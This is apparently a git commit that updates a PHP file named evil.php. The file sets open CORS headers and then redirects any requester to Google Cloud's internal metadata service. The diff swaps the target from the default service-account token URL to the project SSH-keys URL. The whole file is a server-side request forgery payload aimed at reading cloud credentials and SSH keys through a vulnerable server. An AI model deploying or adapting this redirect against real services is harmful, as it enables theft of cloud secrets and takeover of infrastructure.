f3aa793d230453ceba6ce3c86ae92fa61854c81f
Sigit Setiawan <79725109+wansgit@users.noreply.github.com>
2024-03-06 19:02:31 +0700

    Update evil.php

--- evil.php
+++ evil.php
@@ -4,5 +4,5 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
 header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
 header("Content-Type: application/json");
-header("Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"); //IPV6 Compressed
+header("Location: http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"); //IPV6 Compressed
 ?>
